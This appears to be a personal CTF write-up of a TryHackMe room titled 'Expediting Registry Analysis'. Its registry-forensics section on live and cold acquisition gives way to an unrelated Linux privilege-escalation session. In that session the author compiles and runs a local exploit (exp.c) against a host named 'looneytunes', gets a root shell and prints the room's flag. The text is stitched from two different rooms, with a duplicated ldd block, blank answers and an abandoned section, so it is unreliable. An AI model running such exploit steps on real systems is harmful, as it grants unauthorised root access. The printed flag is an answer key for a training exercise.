<p align="center">November 12, 2024</p>
<p align="center">Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
It´s part of my $$\textcolor{#FF69B4}{\textbf{190}}$$-day-streak in  <a href="https://tryhackme.com/r/hacktivities">TryHackMe</a>.</p>

<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{ Expediting Registry Analysis }}$$ </h1>
<p align="center">This room explores different tools used to expedite analysis of registry data during investigation.</p>
<p align="center">Access this 🆓 TryHackMe CTF Room clicking <a href="https://tryhackme.com/r/room/expregistryforensics">Expediting Registry Analysis</a>.</p>
<p align="center">
  <img height="150px" hspace="20" src="https://github.com/user-attachments/assets/0a679284-0798-4f74-9098-92a98c6336e0"><br>
  <img width="800px" src="https://github.com/user-attachments/assets/54e2868b-89d6-4eeb-9689-c1579cddcf74">
</p>

<p align="center">Summary</p>

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [1. Introduction](#1) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [2. Background Information](#2) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [3. Time to Analyze the Vulnerable Code!](#3) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [4. Exploitation](#4) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [5. Try It Yourself!](#5) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [6. Conclusion](#6) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [7. Room Complete](#7) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [8. My Journey](#8)

<br>
<br>
<br>
<h2 align="center">Task 1. Introduction<a id='1'></a></h2>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the question below}}$$ </h3>

> 1.1. <em>I have completed the prerequisites for the room.</em><br><a id='1.1'></a>
>> <code><strong>No answer needed</strong></code>

<br>

<h2 align="center">Task 2. Background Information<a id='2'></a></h2>
<p>To start the investigation, Anna needs to acquire registry data. There are several ways to acquire registry data from a system. We will discuss the most common ones in this room. But before that, let's understand the difference between live and cold collections.</p>

<h3>Live Acquisition</h3>
<p>ive acquisition is done on a running system. In a live acquisition, the Windows OS is already loaded into the memory, and the configurations are all in the memory. In a live system, the registry hives files are locked and cannot be copied without special tools. However, in a live system, since the configuration is already loaded, we don't have to analyse the registry to identify the active configuration of the system (e.g., the CurrentControlSet key is already loaded, and we know which configuration is in use). However, the problem with acquiring registry data from a live system is that whatever tool we use will leave a trace and might overwrite some critical data points. For example, if we use FTK Imager to collect live data, we will have to execute FTK imager, adding an entry to all the registry keys that keep track of program execution. The most common reason a live acquisition is done is to save time. Taking a full disk image and then extracting data from that takes a lot of time and can be impractical when dealing with an outbreak or when quick results are required. It is often better to take a live collection when time is of the essence.</p>
<br>
<h3>Cold Acquisition</h3>
<p>A cold data acquisition is done when the system is not running. In such an acquisition, a full disk image is first taken of the system by putting the system's hard disk drive in a write blocker. The system is shut down at this point. This disk image is then hashed and copied, and all the analysis is done on a copy of the original disk image. This is done to maintain the integrity of the original evidence so that, if need be, it can be proven that the evidence was not tampered with and the results are reproducible. We first mount the disk image using image mounting software to analyse the registry from a cold acquisition and extract the data from the mounted image. Some tools like FTK Imager and Autopsy can perform both steps simultaneously, and we don't need a separate image mounting software to view the data. Though a cold acquisition takes a lot of time, as we can guess from the number of steps involved in this process, it is to be noted that a cold acquisition makes the most negligible impact on the system under analysis, as it can be done from a write-blocked disk image instead of an actual running system. A cold acquisition is more suitable if we have to ensure the integrity of the data for purposes such as going to court. </p>
<br>
<h3>Data Acquisition Using FTK Imager</h3>
<p>FTK Imager is a tool primarily used to take disk and memory images of a live system. However, it can also be used to read acquired disk images. Acquiring a full disk or memory image is out of the scope of this room. However, we will learn to acquire registry data using FTK Imager in this room.<br>

First, we must load the disk image from which we want to extract the data. In the attached VM, we can see the shortcut file for FTK Imager on the Desktop. After starting, we can <code>Add Evidence Item</code> by going to <code>File > Add Evidence Item</code>.</p>

<p>...............</p>

<br>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the question2 below}}$$ </h3>

> 2.1. <em>I have collected registry data from the attached VM, as shown in this task.</em><br><a id='2.1'></a>
>> <code><strong>No answer needed</strong></code>

<br>

> 2.2. <em>When we take a forensic data collection from the disk image of a system, what type of acquisition is it called?</em><br><a id='2.2'></a>
>> <code><strong>___________________</strong></code>

<br>

> 2.3. <em>Is speed one of the advantages of collecting registry data from FTK Imager? Y or N?</em><br><a id='2.2'></a>
>> <code><strong>___________________</strong></code>

<br>





<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the question below}}$$ </h3>

> 2.1. <em>Click and continue learning!</em><br><a id='2.1'></a>
>> <code><strong>No answer needed</strong></code>

<br>

<h2 align="center">Task 3. Time to Analyze the Vulnerable Code!<a id='3'></a></h2>


<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the question below}}$$ </h3>

> 3.1. <em>Click and continue learning!</em><br><a id='3.1'></a>
>> <code><strong>No answer needed</strong></code>

<br>


<h2 align="center">Task 4. Exploitation<a id='4'></a></h2>



<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the question below}}$$ </h3>

> 4.1. <em>Click and continue learning!</em><br><a id='4.1'></a>
>> <code><strong>No answer needed</strong></code>


<br>


<h2 align="center">Task 5. Try It Yourself!<a id='5'></a></h2>



<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the question below}}$$ </h3>

> 5.1. <em></em>What's the value of the flag in /root/root.txt?<a id='5.1'></a>
>> <code><strong>THM{TH-TH-THATS-SECURE-FOLKS!}</strong></code>

<br>

![image](https://github.com/user-attachments/assets/1a773786-155c-4b1c-a8a6-7c1a381c1da8)

<br>

![image](https://github.com/user-attachments/assets/394b7d48-5857-4692-981b-1e56c3297a2a)

<br>

<pre><code>$root@[Attack_Box]:~# ssh nopriv@[Target]
The authenticity of host '[Target] (1[Target])' can't be established.
...
nopriv@1[Target]'s password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

...

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

56 updates can be applied immediately.
30 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
...
nopriv@looneytunes:~$ ls
exp.c  gen_libc.py
nopriv@looneytunes:~$ 
</code></pre>

<br>

<pre><code>nopriv@looneytunes:~$ ls
exp.c  gen_libc.py
nopriv@looneytunes:~$ ^C
nopriv@looneytunes:~$ readelf /usr/bin/man -p .interp

String dump of section '.interp':
  [     0]  /lib64/ld-linux-x86-64.so.2

nopriv@looneytunes:~$
</code></pre>

<br>

<pre><code>nopriv@looneytunes:~$ ldd /usr/bin/man
	linux-vdso.so.1 (0x00007fff21fea000)
	libmandb-2.10.2.so => /usr/lib/man-db/libmandb-2.10.2.so (0x00007fa38ecac000)
	libman-2.10.2.so => /usr/lib/man-db/libman-2.10.2.so (0x00007fa38ec7c000)
	libz.so.1 => /lib/x86_64-linux-gnu/libz.so.1 (0x00007fa38ec5a000)
	libpipeline.so.1 => /lib/x86_64-linux-gnu/libpipeline.so.1 (0x00007fa38ec4d000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fa38ea25000)
	libgdbm.so.6 => /lib/x86_64-linux-gnu/libgdbm.so.6 (0x00007fa38ea11000)
	libseccomp.so.2 => /lib/x86_64-linux-gnu/libseccomp.so.2 (0x00007fa38e9f1000)
	/lib64/ld-linux-x86-64.so.2 (0x00007fa38edd6000)
nopriv@looneytunes:~$
</code></pre>

<br>


<pre><code>nopriv@looneytunes:~$ ldd /usr/bin/man
	linux-vdso.so.1 (0x00007fff21fea000)
	libmandb-2.10.2.so => /usr/lib/man-db/libmandb-2.10.2.so (0x00007fa38ecac000)
	libman-2.10.2.so => /usr/lib/man-db/libman-2.10.2.so (0x00007fa38ec7c000)
	libz.so.1 => /lib/x86_64-linux-gnu/libz.so.1 (0x00007fa38ec5a000)
	libpipeline.so.1 => /lib/x86_64-linux-gnu/libpipeline.so.1 (0x00007fa38ec4d000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fa38ea25000)
	libgdbm.so.6 => /lib/x86_64-linux-gnu/libgdbm.so.6 (0x00007fa38ea11000)
	libseccomp.so.2 => /lib/x86_64-linux-gnu/libseccomp.so.2 (0x00007fa38e9f1000)
	/lib64/ld-linux-x86-64.so.2 (0x00007fa38edd6000)
nopriv@looneytunes:~$
</code></pre>

<br>

<pre><code>nopriv@looneytunes:~$ ls
exp.c  gen_libc.py
nopriv@looneytunes:~$ gcc -o exploit exp.c
nopriv@looneytunes:~$ ls
exp  exp.c  exploit  gen_libc.py
nopriv@looneytunes:~$ chmod +x exploit
nopriv@looneytunes:~$ ./exploit
try 100
try 200
try 300
try 400
try 500
try 600
try 700
try 800
try 900
try 1000
try 1100
try 1200
try 1300
try 1400
try 1500
try 1600
try 1700
try 1800
try 1900
try 2000
try 2100
try 2200
try 2300
try 2400
try 2500
try 2600
try 2700
try 2800
try 2900
try 3000
try 3100
try 3200
try 3300
try 3400
try 3500
try 3600
try 3700
try 3800
try 3900
try 4000
try 4100
try 4200
try 4300
try 4400
try 4500
try 4600
try 4700
try 4800
try 4900
try 5000
try 5100
try 5200
...
# id
uid=0(root) gid=0(root) groups=0(roos),1001(nopriv)
# pwd
/home/nopriv
# cd /root
# ls
root.txt  snap
# cat root.txt
THM{TH-TH-THATS-SECURE-FOLKS!}
</code></pre>

<br>


<h2 align="center">Task 6. Conclusion<a id='5'></a></h2>


<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the question below}}$$ </h3>

> 6.1. <em></em>Click and continue learning!<a id='6.1'></a>
>> <code><strong>No answer needed}</strong></code>

<br>
<h2>Room Complete<a id='7'></a></h2>
<p>Keep learning, keep growing!</p>

<p align="center"> <img width="750px" src="https://github.com/user-attachments/assets/34afa996-4c82-4c13-8337-5a7bc8aae90e"></p>

<h2>My Journey<a id='8'></a></h2>
<p>Following I share the status of my journey in TryHackMe.</p>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     |
| :---------------: | :------- | :----------- | :----------- | :---------- | :--------- | :------  | :-------- |
|                   |          | WorldWide    | Brazil       | WorldWide   | Brazil     |          | Completed |
| November 11, 2024 | 189      |       1,237ª |          25ª |      4,278ª |        57ª | 54,886   |       417 |

</div>


<p align="center"> <img width="750px" src="https://github.com/user-attachments/assets/9c86e878-6f67-48c3-be74-889a4e43f954"></p>

<p style="text-align: center;">Thank you for coming. Hope to learn together again!!</p>

